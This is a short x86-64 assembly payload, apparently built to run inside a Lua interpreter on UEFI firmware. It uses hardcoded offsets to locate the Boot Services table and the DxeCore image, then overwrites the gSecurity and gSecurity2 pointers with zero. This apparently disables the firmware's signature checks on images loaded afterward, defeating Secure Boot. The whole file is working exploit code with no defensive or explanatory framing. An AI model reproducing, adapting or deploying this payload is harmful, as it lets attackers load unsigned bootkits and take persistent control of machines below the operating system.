  .globl _start

LuaEfi_off_gBS = 0x34638
LuaEfi_off_retaddr = 0x1cf13

BS_off_LoadImage = 200

DxeCore_off_CoreLoadImage = 0x9f4
DxeCore_off_gSecurity = 0x25710
DxeCore_off_gSecurity2 = 0x255f0

_start:
  # RAX = gBS
  mov (%rsp),%rax
  add $(LuaEfi_off_gBS-LuaEfi_off_retaddr),%rax
  mov (%rax),%rax

  # RAX = DxeCore.efi
  mov BS_off_LoadImage(%rax),%rax
  add $-DxeCore_off_CoreLoadImage,%rax

  movq $0,DxeCore_off_gSecurity(%rax)
  movq $0,DxeCore_off_gSecurity2(%rax)

  xor %eax,%eax
  ret
